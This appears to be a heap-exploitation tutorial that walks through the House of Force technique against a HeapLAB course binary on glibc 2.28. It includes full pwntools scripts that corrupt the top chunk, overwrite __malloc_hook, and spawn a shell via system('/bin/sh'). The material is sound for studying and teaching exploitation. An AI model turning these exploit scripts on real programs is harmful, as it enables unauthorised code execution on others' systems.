---
title: "House of Force"
categories: [Heap, House of Force]
tags: [glibc, heap, pwn]
mermaid: true
---

## **Introduction**


Welcome to the first heap exploitation technique we’re going to cover: the **House of Force**. 

The **House of Force** technique exploits the top chunk in the heap. The top chunk is a special chunk that represents the remaining free memory in the heap. When a large allocation request is made, malloc checks if the top chunk can satisfy the request. If so, it splits the top chunk and returns the requested memory.

By manipulating the size of the top chunk, an attacker can force malloc to return a pointer to an arbitrary memory location (e.g., GOT, stack, etc.). This allows the attacker to overwrite critical data structures and gain control of the program's execution flow.

**Top Chunk:** 

The top chunk is the last chunk in the heap and represents the remaining free memory. Its size is stored in its header.

**Size Manipulation:** 

By overwriting the size field of the top chunk, an attacker can control where malloc allocates memory.

**Arbitrary Write:** 

Once the attacker controls the allocation location, they can overwrite critical data structures.

### Prerequisites

For the House of Force to work, several conditions must be met:

1. **Control over the size of a malloc request**: You need to be able to allocate chunks with attacker-controlled sizes.
2. **Control over the top chunk size**: You need to be able to overwrite the size field of the top chunk.
3. **No integrity checks**: The target system must not have checks that prevent top chunk size manipulation.


I'll be using the `house_of_force` binary from the Course.

## Step-by-Step Exploitation

### **Step 1: Identify the Vulnerability**

The House of Force technique requires:
- **Control over the size of a large allocation**: The attacker must be able to allocate a chunk of arbitrary size.
- **Ability to overwrite the top chunk size**: The attacker must be able to overwrite the size field of the top chunk.


### **Step 2: Overwrite the Top Chunk Size**
- Allocate a chunk and overflow it to overwrite the size field of the top chunk.
- Set the size to a very large value (e.g., 0xffffffffffffffff) to make malloc believe there is a huge amount of free memory.


### **Step 3: Force malloc to Return an Arbitrary Pointer**
- Request a large allocation that, when added to the current heap pointer, results in the desired target address.
- Calculate the size of the allocation as:
```txt
size = target_address - current_heap_pointer - chunk_header_size
```

`malloc` will return a pointer to the target address.

### **Step 4: Overwrite Critical Data**
- Use the returned pointer to overwrite critical data structures (e.g., GOT, function pointers, etc.).
- Redirect execution to shellcode or a one-gadget.


**Let's do a hands on practice on House of Force Technique:**


### 1. Overwrite the Top Chunk Size

The binary prompts for input and performs `malloc` allocations. It prints a runtime address for `puts()` and the current heap base address, which are useful information leaks for a teaching lab.

We can confirm this in **pwndbg**:

```bash
gdb ./house_of_force -q
pwndbg> r
Starting program: .../HeapLAB/01/house_of_force/house_of_force 

===============
|   HeapLAB   |  House of Force
===============

puts() @ 0x7ffff786df10
heap @ 0x603000

1) malloc 0/4
2) target
3) quit
> 

```

Press **Ctrl+C** to interrupt the running program and return to the debugger prompt.

Using pwndbg’s `xinfo` command we can inspect those addresses:

```bash
pwndbg> xinfo 0x7ffff786df10
Extended information for virtual address 0x7ffff786df10:

  Containing mapping:
    0x7ffff7800000     0x7ffff79ac000 r-xp   1ac000      0 /home/fury/Desktop/Final_Path/ExpDevG0d/HeapExp/HeapLAB/01/.glibc/glibc_2.28_no-tcache/libc-2.28.so

  Offset information:
         Mapped Area 0x7ffff786df10 = 0x7ffff7800000 + 0x6df10
         File (Base) 0x7ffff786df10 = 0x7ffff7800000 + 0x6df10
      File (Segment) 0x7ffff786df10 = 0x7ffff7800000 + 0x6df10
         File (Disk) 0x7ffff786df10 = .../HeapLAB/01/.glibc/glibc_2.28_no-tcache/libc-2.28.so + 0x6df10

 Containing ELF sections:
               .text 0x7ffff786df10 = 0x7ffff7821630 + 0x4c8e0
```

This confirms that the leaked `puts()` address lies inside the program’s mapped `libc` image.

```bash
pwndbg> xinfo 0x603000
Extended information for virtual address 0x603000:

  Containing mapping:
          0x603000           0x624000 rw-p    21000      0 [heap]

  Offset information:
         Mapped Area 0x603000 = 0x603000 + 0x0

```

This shows that `0x603000` is inside the process heap.

Let’s use the following pwntools template to launch the binary, grab the leaked `puts` and heap addresses, compute the libc base, and drive simple menu actions. We will be sending `'A'*24+p64(0xdeadbeef)` which will overwrite the top_chunk size.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './house_of_force')
libc = exe.libc

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main 
continue
'''.format(**locals())

# Function to get leaked addresses
def leak_addresses():
    io.recvuntil(b'puts() @ ')
    puts_address = int(io.recvline().strip(), 16)

    io.recvuntil(b'heap @ ')
    heap_address = int(io.recvline().strip(), 16)
    
    return puts_address, heap_address

# malloc()
def malloc(size, data):
    io.sendline(b'1')
    sleep(0.3)
    io.sendline(size)
    sleep(0.3)
    io.sendline(data)

# target()
def target():
    io.recvuntil(b'> ')
    io.sendline(b'2')



# -- Exploit goes here --

io = start()

puts_address, heap_address = leak_addresses()
log.info(f"Leaked puts address: {hex(puts_address)}")
log.info(f"Leaked heap address: {hex(heap_address)}")

libc_base = puts_address - libc.symbols['puts']
log.info(f"Leaked libc base {hex(libc_base)}")

malloc(b'24',b'A'*24+p64(0xdeadbeef))

io.interactive()
```

We send the payload `b'A'*24 + p64(0xdeadbeef)`, which overwrites the top-chunk **size field** in the heap metadata:

```python
payload = b'A' * 24 + p64(0xdeadbeef)
```

The `tbreak` command sets a breakpoint, but it is **temporary**. This means that it is automatically deleted after it is hit for the first time.

```bash
./exploit.py GDB NOASLR
```

On **Ctrl+C** in GDB and using `vis` command for visualizing chunks of `heap` section we can see that:

```bash
pwndbg> vis

0x603000	0x0000000000000000	0x0000000000000021	........!.......
0x603010	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x603020	0x4141414141414141	0x00000000deadbeef	AAAAAAAA........ <-- Top chunk
pwndbg> top_chunk 
Top chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
Addr: 0x603020
Size: 0xdeadbee8 (with flag bits: 0xdeadbeef)
```

#### What does this means

- The 8‑byte value we wrote into the top-chunk size field is `0xdeadbeef`.
- In glibc chunk headers the low 3 bits are flags (`PREV_INUSE` = `0x1`, `IS_MMAPPED` = `0x2`, `NON_MAIN_ARENA` = `0x4`), so the allocator interprets the _actual_ usable size as the written value with those low bits cleared.
- Masking out the low 3 bits yields `0xdeadbeef & ~0x7 = 0xdeadbee8`. That’s why `pwndbg` prints the top chunk _Size_ as `0xdeadbee8` while also showing the raw flag bits as `0xdeadbeef` — the allocator reports the masked size and the flags separately.
- The `top_chunk` summary also enumerates the three flag bits (`PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA`) because the low bits you wrote were `0x7`.


### 2. Force a Large Allocation

Now we overwrite the top-chunk size field with a very large value (for example `0xffffffffffffffff`) to make the allocator treat the top chunk as huge:

```bash
pwndbg> vis

0x603000	0x0000000000000000	0x0000000000000021	........!.......
0x603010	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x603020	0x4141414141414141	0x0fffffffffffffff	AAAAAAAA........ <-- Top chunk
pwndbg> top_chunk 
Top chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
Addr: 0x603020
Size: 0xffffffffffffff8 (with flag bits: 0xfffffffffffffff)

```

This makes **malloc** believe there's virtually unlimited memory available.

```txt
usable_size = raw_size & ~0x7
           = 0xffffffffffffffff & ~0x7
           = 0xfffffffffffffff8
```

That’s why `pwndbg` reports the top chunk size as `0xfffffffffffffff8` while also showing the raw bits you wrote.

With the top chunk appearing extremely large, carefully chosen future `malloc` requests can advance the top chunk to attacker-controlled addresses — this is the core idea behind House of Force.


### 3. Overwrite the Target (Arbitrary Write)

Let's achieve arbitrary write. We will try to overwrite the `target` variable. As the binary is having PIE disabled, address of `target` will not change.

As we have overwritten `top_chunk` size field. Now we will wrap around the VA space and will request data such that we will just approach the `target` location.

> Note: When I say "wrap around VA space" — what we actually do is **advance the top chunk** by requesting a very large allocation so that the returned user pointer is positioned just before `target`. This is how House of Force converts a corrupted top-chunk size into an arbitrary write target.

The `target` variable is stored in `.data` section.

```bash
$ gdb ./house_of_force
pwndbg> r

# Ctrl + C

pwndbg> dq &target
0000000000602010     0058585858585858 0000000000000000
0000000000602020     0000000000000000 0000000000000000
0000000000602030     0000000000000000 0000000000000000
0000000000602040     0000000000000000 0000000000000000

pwndbg> xinfo &target
#...

 Containing ELF sections:
               .data 0x602010 = 0x602000 + 0x10
```

**Memory map of a process**

![memory map](https://www.researchgate.net/profile/Md-Monjurul-Karim/publication/286921747/figure/fig7/AS:668583600349189@1536414160236/UNIX-Process-Memory-Layout.ppm)

*Source* [researchgate](https://www.researchgate.net/figure/UNIX-Process-Memory-Layout_fig7_286921747)

When using `malloc()` for memory allocation, the system typically allocates more memory than the requested size. The returned user pointer points to a memory block that includes:
- Metadata Region: The first 16 bytes are reserved for internal bookkeeping information.
- User Accessible Memory: The remaining bytes are available for the user's data.

**Memory Layout**
Metadata (16 bytes): Contains information about:
- Block size
- Allocation flags
- Memory management details

User Pointer: Points to the memory address immediately after the metadata, providing the actual usable memory space

Let's define a `distance()` function who calculates the distance between the `target` and `heap_addr`

```python
# distance()
def distance(startAddr, endAddr):
    return (0xffffffffffffffff-startAddr) + endAddr

```

We need to calculate the allocation size that will position the next allocation at our target address. 

```python
malloc(str(distance).encode(), b'B'*((target - 0x20) - (heap_address + 0x20)))
```

We added `heap_address + 0x20` to account for the first heap chunk allocation, and we just need to land before the `target` so that our third allocation will overlap with the `target`.  


Use the following script:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './house_of_force')
libc = exe.libc

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main 
continue
'''.format(**locals())

# Function to get leaked addresses
def leak_addresses():
    io.recvuntil(b'puts() @ ')
    puts_address = int(io.recvline().strip(), 16)

    io.recvuntil(b'heap @ ')
    heap_address = int(io.recvline().strip(), 16)
    
    return puts_address, heap_address

# malloc()
def malloc(size, data):
    io.sendline(b'1')
    sleep(0.3)
    io.sendline(size)
    sleep(0.3)
    io.sendline(data)

# target()
def target():
    io.recvuntil(b'> ')
    io.sendline(b'2')

# distance()
def distance(startAddr, endAddr):
    return (0xffffffffffffffff-startAddr) + endAddr


# -- Exploit goes here --

io = start()

puts_address, heap_address = leak_addresses()
log.info(f"Leaked puts address: {hex(puts_address)}")
log.info(f"Leaked heap address: {hex(heap_address)}")

libc.address = puts_address - libc.symbols['puts']
log.info(f"Leaked libc base {hex(libc.address)}")

# First malloc to setup top chunk
# malloc(b'24',b'A'*24+p64(0xdeadbeef))
malloc(b'24',b'A'*24+p64(0xffffffffffffffff))

# Second malloc to get chunk overlapping target
# Calculate distance to target
target_addr = exe.symbols['target']
log.info(f"Target variable address: {hex(target_addr)}")
top_chunk_addr = heap_address + 0x20
log.info(f"Top chunk address: {hex(top_chunk_addr)}")
dist = distance(top_chunk_addr, target_addr - 0x20)

malloc(str(dist).encode(), b'B'*32)
sleep(1)

# Third malloc to overwrite target
malloc(b'24', b'HACKED!') 

io.interactive()
```

You can verify this:

```bash
$ ./arb_write.py GDB NOASLR
#...
> size: data: 
1) malloc 3/4
2) target
3) quit
> $ 2

target: HACKED!

```

You can also use:
```python
dist = distance(
    heap_address + 0x30,    # Current top chunk location + header size
    target_addr - 0x10     # Where we want new chunk header
)
```

Why +0x30?
- heap_addr + 0x20 → top chunk starts here
- +0x10 → account for top chunk's own header
= heap_addr + 0x30

Why -0x10?
- malloc returns address AFTER chunk header
- So header must be 0x10 bytes before target
= targetVar - 0x10


### 4. Targeting `__malloc_hook` for Code Execution

Now let's demonstrate a more practical exploitation by targeting `__malloc_hook` instead of the `target` variable. This allows us to gain code execution when `malloc` is called.

### **What is `__malloc_hook`?**

`__malloc_hook` was a function pointer variable located in glibc's writable data section that allowed developers to intercept and debug memory allocation calls. When set to a non-NULL value, any call to `malloc()` would first invoke the function pointed to by `__malloc_hook`.

**Key Properties:**

- Located in libc's writable data segment
- Executed before every `malloc()` call
- Perfect target for control flow hijacking
- At a fixed offset from the libc base address

> **Note:** `__malloc_hook` (and related hooks like `__free_hook`, `__realloc_hook`) were removed in glibc 2.34+ as a security hardening measure. This technique applies to older glibc versions (typically < 2.34).


### **Why Target `__malloc_hook`?**

Malloc hooks were particularly dangerous for attackers because:

1. **Reliable Location**: Unlike stack or heap addresses, `__malloc_hook` resides at a fixed offset from the libc base
2. **Automatic Execution**: Any subsequent `malloc()` call automatically triggers the hook
3. **Bypasses ASLR**: With a libc leak, the address becomes predictable
4. **Widespread Vulnerability**: Most programs use dynamic memory allocation

### **Step-by-Step `__malloc_hook` Attack**

#### **Step 1: Locate `__malloc_hook`**

```python
# Calculate libc base from leaked puts address
libc_base = puts_address - libc.symbols['puts']
malloc_hook_addr = libc_base + libc.symbols['__malloc_hook']
log.info(f"__malloc_hook address: {hex(malloc_hook_addr)}")
```

#### **Step 2: Calculate Allocation Distance**

Determine the size needed to position the heap so the next allocation returns a pointer to `__malloc_hook`:

```python
# Current top chunk location after first allocation
current_top = heap_address + 0x20

# We want the next allocation to return __malloc_hook's address
# distance = (libc.address + 0x3afc10 - 0x20) - (heap_addr + 0x20)
```

#### **Step 3: **Overwrite `__malloc_hook`**

The next allocation will return a pointer to `__malloc_hook`:


```python
# Overwrite __malloc_hook with 0xdeadbeef
# malloc((libc.address + 0x3afc10 - 0x10) - (heap_addr + 0x30), p64(0xdeadbeef))

# OR
# Overwrite __malloc_hook with one-gadget or system address
```

#### **Step 4: Trigger Execution**

Call `malloc` to trigger the overwritten hook:

```python
# This malloc call will execute our one-gadget
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'size: ', b'24')
```

Now let's put everything together and demonstrate the complete exploitation chain. The final step is triggering our overwritten `__malloc_hook` to gain code execution.


```python
io = start()

puts_address, heap_address = leak_addresses()
log.info(f"Leaked puts address: {hex(puts_address)}")
log.info(f"Leaked heap address: {hex(heap_address)}")

libc.address = puts_address - libc.symbols['puts']
log.info(f"Leaked libc base {hex(libc.address)}")
# Calculate libc base from leaked puts address

malloc_hook_addr = libc.symbols['__malloc_hook']
log.info(f"__malloc_hook address: {hex(malloc_hook_addr)}")

# First malloc to setup top chunk
# malloc(b'24',b'A'*24+p64(0xdeadbeef))
malloc(b'24',b'A'*24+p64(0xffffffffffffffff))

# Second malloc to get chunk overlapping target
# Calculate distance to target
target_addr = exe.symbols['target']
log.info(f"Target variable address: {hex(target_addr)}")
top_chunk_addr = heap_address + 0x20
log.info(f"Top chunk address: {hex(top_chunk_addr)}")



dist = (malloc_hook_addr - 0x20) - (heap_address + 0x20)
malloc(str(dist).encode(), b'B'*32)
sleep(1)

# Third malloc to overwrite __malloc_hook
malloc(b'24', p64(0xdeadbeef))

io.interactive()
```

When you use this script and you dump quad words at `__malloc_hook`, you will find `0xdeadbeef` -

```bash
pwndbg> dq &__malloc_hook 
00007ffff7bafc10     00000000deadbeef 000000000000000a
00007ffff7bafc20     0000000000000000 ffff800008a533f9
00007ffff7bafc30     0000000000000000 0000000000000000
00007ffff7bafc40     0000000000000000 0000000000000000

```

Our next allocation, `malloc` will call `__malloc_hook` which is overwritten with `0xdeadbeef`.

```bash
1) malloc 3/4
2) target
3) quit
> $ 1
size: $ 24

```

In `pwndbg` terminal you'll find -

```bash
pwndbg> c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00000000deadbeef in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
*RAX  0xdeadbeef
 RBX  0
*RCX  0
*RDX  0xffffffffffffffe8
*RDI  0x18
*RSI  0x40098a (main+371) ◂— mov rdx, rax
*R8   0x7fffffffe042 ◂— 0xa /* '\n' */
*R9   0
*R10  0x7ffff79618c0 (_nl_C_LC_CTYPE_toupper+512) ◂— add byte ptr [rax], al
*R11  0xa
 R12  0x400730 (_start) ◂— xor ebp, ebp
 R13  0x7fffffffe1b0 ◂— 1
 R14  0
 R15  0
*RBP  0x7fffffffe0d0 —▸ 0x400ab0 (__libc_csu_init) ◂— push r15
*RSP  0x7fffffffe078 —▸ 0x40098a (main+371) ◂— mov rdx, rax
*RIP  0xdeadbeef
──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
Invalid address 0xdeadbeef

```


### 5. Getting Shell - Practical Code Execution

Now that we've demonstrated control flow hijacking with `0xdeadbeef`, let's turn this into real code execution by getting a shell. We'll explore several methods to achieve this.

#### Method 1: Using One-Gadget RCE

One-gadgets are addresses in libc that spawn a shell when jumped to directly.


**Find One-Gadgets**

```bash
$ ldd house_of_force 
	linux-vdso.so.1 (0x00007ffc983fe000)
	libc.so.6 => ../.glibc/glibc_2.28_no-tcache/libc.so.6 (0x000074654fc00000)
	../.glibc/glibc_2.28_no-tcache/ld.so.2 => /lib64/ld-linux-x86-64.so.2 (0x000074655014f000)
$ one_gadget ../.glibc/glibc_2.28_no-tcache/libc.so.6
0x419f6 execve("/bin/sh", rsp+0x30, environ)
constraints:
  address rsp+0x40 is writable
  rax == NULL || {rax, "-c", r12, NULL} is a valid argv

0x41a4a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv

0xdf681 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv

```

Just try to use `libc.address + one_gadget` in place of `0xdeadbeef`

```python
malloc(b'24', p64(libc.address + one_gadget))
```

None of these worked for me...

#### Method 2: Calling system("/bin/sh")

If one-gadgets don't work due to constraint issues, we can call `system("/bin/sh")` directly.

We will overwrite `__malloc_hook` with the `system()` address we get from libc. When `__malloc_hook` is called, the first argument (size requested from malloc) will be passed as the argument to `system()`.


```python
# -- Exploit goes here --

io = start()

puts_address, heap_address = leak_addresses()
log.info(f"Leaked puts address: {hex(puts_address)}")
log.info(f"Leaked heap address: {hex(heap_address)}")

libc.address = puts_address - libc.symbols['puts']
log.info(f"Leaked libc base {hex(libc.address)}")
# Calculate libc base from leaked puts address

malloc_hook_addr = libc.symbols['__malloc_hook']
log.info(f"__malloc_hook address: {hex(malloc_hook_addr)}")

# First malloc to setup top chunk
# malloc(b'24',b'A'*24+p64(0xdeadbeef))
malloc(b'24',b'A'*24+p64(0xffffffffffffffff))

# Second malloc to get chunk overlapping target
# Calculate distance to target
target_addr = exe.symbols['target']
log.info(f"Target variable address: {hex(target_addr)}")
top_chunk_addr = heap_address + 0x20
log.info(f"Top chunk address: {hex(top_chunk_addr)}")



dist = (malloc_hook_addr - 0x20) - (heap_address + 0x20)
malloc(str(dist).encode(), b'B'*32)
sleep(1)

# Third malloc to overwrite __malloc_hook
# malloc(b'24', p64(0xdeadbeef))

# system()

system_addr = libc.symbols['system']
log.info(f"system() address: {hex(system_addr)}")

malloc(b'24', p64(system_addr))

# Next find '/bin/sh' string in libc
binsh_address = next(libc.search(b'/bin/sh'))
log.info(f"'/bin/sh' string address: {hex(binsh_address)}")

# Trigger __malloc_hook by calling malloc again which will call system('/bin/sh')
malloc(str(binsh_address).encode(), b'')

io.interactive()
```

If we don't want to use `next(libc.search(b'/bin/sh'))` to find the `"/bin/sh"` string in libc, we can write our own `"/bin/sh\x00"` string during the first allocation and pass its address.


```python
# -- Exploit goes here --

io = start()

puts_address, heap_address = leak_addresses()
log.info(f"Leaked puts address: {hex(puts_address)}")
log.info(f"Leaked heap address: {hex(heap_address)}")

libc.address = puts_address - libc.symbols['puts']
log.info(f"Leaked libc base {hex(libc.address)}")
# Calculate libc base from leaked puts address

malloc_hook_addr = libc.symbols['__malloc_hook']
log.info(f"__malloc_hook address: {hex(malloc_hook_addr)}")

# First malloc to setup top chunk
# malloc(b'24',b'A'*24+p64(0xdeadbeef))
# malloc(b'24',b'A'*24+p64(0xffffffffffffffff))
payload = b'/bin/sh\x00'
payload += b'A' * (24 - len(payload))
payload += p64(0xffffffffffffffff)
malloc(b'24', payload)



# Second malloc to get chunk overlapping target
# Calculate distance to target
target_addr = exe.symbols['target']
log.info(f"Target variable address: {hex(target_addr)}")
top_chunk_addr = heap_address + 0x20
log.info(f"Top chunk address: {hex(top_chunk_addr)}")



dist = (malloc_hook_addr - 0x20) - (heap_address + 0x20)
malloc(str(dist).encode(), b'B'*32)
sleep(1)

# Third malloc to overwrite __malloc_hook
# malloc(b'24', p64(0xdeadbeef))

# system()

system_addr = libc.symbols['system']
log.info(f"system() address: {hex(system_addr)}")

malloc(b'24', p64(system_addr))

# Next find '/bin/sh' string in libc
binsh_address = next(libc.search(b'/bin/sh'))
log.info(f"'/bin/sh' string address: {hex(binsh_address)}")

# Trigger __malloc_hook by calling malloc again which will call system('/bin/sh')
# malloc(str(binsh_address).encode(), b'')
malloc(str(heap_address+0x10).encode(), b'')
# As already cleared we start writing from heap_address + 0x10

io.interactive()
```


The exploit output demonstrates successful code execution:

```bash
$ ./exp.py 
#...
[+] use_of_force': pid 159704
[*] Leaked puts address: 0x74a28b86df10
[*] Leaked heap address: 0x11dcd000
[*] Leaked libc base 0x74a28b800000
[*] __malloc_hook address: 0x74a28bbafc10
[*] Target variable address: 0x602010
[*] Top chunk address: 0x11dcd020
[*] system() address: 0x74a28b841b70
[*] '/bin/sh' string address: 0x74a28b977375
[*] Switching to interactive mode
> size: $ whoami
fury
$ date
Saturday 27 September 2025 03:01:38 PM IST
```

### Conclusion

The House of Force technique demonstrates how a seemingly limited heap overflow vulnerability can be transformed into full code execution.

**Defensive Implications:**

- **Top Chunk Integrity Checks**: Newer glibc versions validate top chunk sizes
- **Hook Removal**: `__malloc_hook` and related hooks were removed in glibc 2.34+
- **Enhanced Randomization**: Improved ASLR and heap layout randomization
- **Tcache Hardening**: Additional security checks in modern heap implementations


